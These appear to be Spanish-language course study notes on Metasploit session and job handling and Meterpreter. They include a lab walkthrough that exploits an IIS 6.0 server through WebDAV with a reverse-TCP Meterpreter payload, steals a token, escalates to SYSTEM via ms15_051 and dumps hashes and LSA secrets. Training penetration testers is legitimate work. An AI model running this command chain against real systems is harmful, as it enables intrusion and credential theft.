
## 1. Gestión de sesiones

Las **sesiones** permiten mantener conexiones con los objetivos mientras se utilizan otros módulos de Metasploit. Al poner una sesión en segundo plano, la conexión continúa activa mientras no se pierda el canal de comunicación.

### Comandos principales

|Comando|Función|
|---|---|
|`sessions`|Lista las sesiones activas.|
|`sessions -i <ID>`|Interactúa con una sesión concreta.|
|`background`|Envía la sesión actual a segundo plano.|
|`bg`|Alias de `background` en Meterpreter.|
|`Ctrl + Z`|Envía la sesión a segundo plano desde una sesión interactiva.|
|`exit`|Finaliza la sesión actual de Meterpreter.|

### Ejemplo de uso

```
# Desde Meterpreter, volver a msfconsole
meterpreter > background

# Listar las sesiones activas
msf6 > sessions

# Interactuar con la sesión 1
msf6 > sessions -i 1
```

Las sesiones también permiten ejecutar módulos de post-explotación sobre un sistema previamente comprometido.

### Ejecutar módulos sobre una sesión

1. Poner la sesión de Meterpreter en segundo plano.
    
2. Buscar el módulo que se quiere ejecutar.
    
3. Seleccionarlo.
    
4. Consultar sus opciones.
    
5. Asignar el identificador de la sesión mediante `SESSION`.
    
6. Ejecutar el módulo.
    

Ejemplo con `local_exploit_suggester`:

```
meterpreter > background

msf6 > search local_exploit_suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

El módulo analiza posibles exploits locales para el sistema objetivo. Los resultados deben investigarse individualmente, ya que no garantizan que todos los exploits sugeridos funcionen.

## 2. Trabajos (Jobs)

Los **jobs** permiten ejecutar tareas en segundo plano dentro de Metasploit.

Son especialmente útiles cuando un módulo mantiene ocupado un puerto que necesitamos utilizar para otra tarea. Cancelar una operación con `Ctrl + C` no equivale necesariamente a finalizar correctamente un trabajo en segundo plano.

### Comandos principales

|Comando|Función|
|---|---|
|`jobs -h`|Muestra la ayuda del comando.|
|`jobs -l`|Lista los trabajos activos.|
|`jobs -i <ID>`|Muestra información detallada de un trabajo.|
|`jobs -k <ID>`|Finaliza un trabajo específico.|
|`jobs -K`|Finaliza todos los trabajos activos.|
|`jobs -v -l`|Muestra información más detallada de los trabajos.|

### Ejecutar un exploit como trabajo

Añadir `-j` a `exploit` o `run` permite ejecutar el módulo como un trabajo en segundo plano.

```
# Ejecutar el exploit como trabajo
msf6 exploit(multi/handler) > exploit -j

# Listar los trabajos activos
msf6 > jobs -l

# Finalizar el trabajo con ID 0
msf6 > jobs -k 0

# Finalizar todos los trabajos
msf6 > jobs -K
```

**Diferencia importante:**

- `sessions`: administra las sesiones de comunicación establecidas con los objetivos.
    
- `jobs`: administra las tareas que se ejecutan en segundo plano.

## 3. Meterpreter

**Meterpreter** es un payload de Metasploit orientado principalmente a la post-explotación. Proporciona una interfaz con funciones adicionales para enumerar el sistema, gestionar procesos, recopilar información y realizar otras operaciones.

Según el contenido del módulo, sus características principales son:

- **Sigiloso:** está diseñado para residir en memoria y puede inyectarse en procesos existentes.
    
- **Potente:** permite comunicarse con el objetivo mediante canales y abrir una shell del sistema.
    
- **Extensible:** permite cargar extensiones durante la sesión sin reconstruir el payload.
    

El tráfico de Meterpreter en la configuración descrita por el módulo utiliza cifrado AES.

### Flujo de ejecución

1. El objetivo ejecuta el stager inicial.
    
2. El stager carga la DLL mediante el mecanismo Reflective.
    
3. Se inicializa el núcleo de Meterpreter y se establece la comunicación cifrada.
    
4. Se cargan las extensiones disponibles, como `stdapi` y, cuando corresponde, `priv`.
    
5. Se obtiene una sesión interactiva de Meterpreter.
    

Para seleccionar un payload compatible con el objetivo:

```
show payloads
set payload windows/meterpreter/reverse_tcp
```

La elección depende del sistema operativo objetivo y del tipo de conexión deseado.

### Comandos básicos de Meterpreter

|Comando|Función|
|---|---|
|`help` o `?`|Muestra los comandos disponibles.|
|`background` o `bg`|Envía la sesión a segundo plano.|
|`exit` o `quit`|Finaliza la sesión.|
|`getuid`|Muestra el usuario con el que se ejecuta la sesión.|
|`ps`|Enumera los procesos.|
|`migrate <PID>`|Intenta migrar Meterpreter a otro proceso.|
|`shell`|Abre una shell del sistema operativo.|
|`load <extensión>`|Carga una extensión.|
|`sessions`|Permite cambiar de sesión.|
|`sysinfo`|Muestra información del sistema.|
|`hashdump`|Intenta obtener los hashes de las cuentas locales.|
|`resource <archivo>`|Ejecuta comandos almacenados en un archivo.|

## 4. Ejemplo práctico: explotación y post-explotación

El módulo utiliza un servidor Windows con **Microsoft IIS 6.0** como ejemplo.

### Paso 1. Enumeración

Ejecutar un escaneo desde `msfconsole` y almacenar los resultados en la base de datos:

```
db_nmap -sV -p- -T5 -A <IP_OBJETIVO>
```

Consultar los hosts y servicios descubiertos:

```
hosts
services
```

En el ejemplo del curso se identifica IIS 6.0 y se investiga la vulnerabilidad CVE-2017-7269.

### Paso 2. Seleccionar y configurar el exploit

```
search iis_webdav_upload_asp
use exploit/windows/iis/iis_webdav_upload_asp
show options

set RHOST <IP_OBJETIVO>
set LHOST tun0

run
```

El ejemplo obtiene una sesión de Meterpreter mediante el payload `windows/meterpreter/reverse_tcp`.

**Importante:** el módulo intenta eliminar el archivo ASP utilizado durante la explotación. En el ejemplo, la eliminación falla con `403 Forbidden`, dejando un archivo en el objetivo. Una sesión de Meterpreter en memoria no significa que los archivos auxiliares creados durante la explotación también hayan desaparecido.

### Paso 3. Comprobar el contexto de ejecución

```
meterpreter > getuid
meterpreter > ps
```

Si `getuid` devuelve un error de acceso, el curso muestra el uso de `steal_token` con el PID de un proceso adecuado para adoptar su token de seguridad:

```
meterpreter > steal_token <PID>
meterpreter > getuid
```

Esto no garantiza privilegios elevados: el resultado depende de los permisos y del contexto del proceso seleccionado.

### Paso 4. Buscar oportunidades de escalada

Enviar la sesión a segundo plano y ejecutar el módulo de reconocimiento:

```
meterpreter > background

msf6 > search local_exploit_suggester
msf6 > use post/multi/recon/local_exploit_suggester
show options

set SESSION 1
run
```

El módulo comprueba posibles exploits locales compatibles con el sistema.

En el ejemplo, el curso identifica `exploit/windows/local/ms15_051_client_copy_image` como una opción aparentemente vulnerable.

### Paso 5. Ejecutar el módulo local

```
use exploit/windows/local/ms15_051_client_copy_image
show options

set SESSION 1
set LHOST tun0

run
```

Si el exploit funciona, puede abrirse una segunda sesión con privilegios superiores. Comprobar el usuario:

```
meterpreter > getuid
```

En el ejemplo del curso, la sesión resultante se ejecuta como `NT AUTHORITY\SYSTEM`.

## 5. Recopilación de credenciales y secretos

Una vez obtenidos los privilegios necesarios, Meterpreter dispone de comandos para intentar extraer información sensible del sistema.

|Comando|Función|
|---|---|
|`hashdump`|Intenta volcar los hashes de las cuentas locales.|
|`lsa_dump_sam`|Intenta obtener información de la base de datos SAM.|
|`lsa_dump_secrets`|Intenta extraer secretos almacenados por LSA.|

Ejemplo:

```
meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

Estos comandos pueden proporcionar hashes de contraseñas, secretos de servicios y otra información sensible. Su disponibilidad y resultados dependen de los privilegios y de las protecciones del sistema.

En una red más extensa, la información obtenida puede servir para investigar otros accesos y recursos internos, siempre dentro del alcance autorizado de la evaluación.

## 6. Flujo de trabajo para recordar

```
1. Enumerar el objetivo
   └── db_nmap -sV -p- -T5 -A <IP>

2. Buscar y configurar el exploit
   └── search <término>
   └── use <módulo>
   └── show options
   └── set RHOST <IP>
   └── set LHOST tun0
   └── run

3. Gestionar la sesión
   └── sessions
   └── sessions -i <ID>
   └── background

4. Ejecutar post-explotación
   └── search local_exploit_suggester
   └── set SESSION <ID>
   └── run

5. Investigar las opciones de escalada
   └── Seleccionar un módulo compatible
   └── Configurar SESSION y LHOST
   └── Ejecutar y comprobar el resultado con getuid

6. Recopilar información, si está autorizado
   └── sysinfo
   └── ps
   └── hashdump
   └── lsa_dump_sam
   └── lsa_dump_secrets
```

### Puntos clave para el examen

- `**sessions**` **y** `**jobs**` **no son lo mismo:** las sesiones representan conexiones con objetivos; los trabajos representan tareas en segundo plano.
    
- `**exploit -j**` ejecuta un exploit como trabajo en segundo plano.
    
- `**sessions -i <ID>**` permite volver a una sesión activa.
    
- `**set SESSION <ID>**` vincula un módulo de post-explotación a una sesión concreta.
    
- `**local_exploit_suggester**` identifica posibles exploits locales; sus resultados deben validarse.
    
- `**getuid**` permite comprobar el usuario de la sesión.
    
- **Meterpreter** amplía las capacidades de una shell con funciones de enumeración y post-explotación.
    
- Una sesión activa no garantiza privilegios de administrador ni la eliminación de los archivos utilizados durante la explotación.
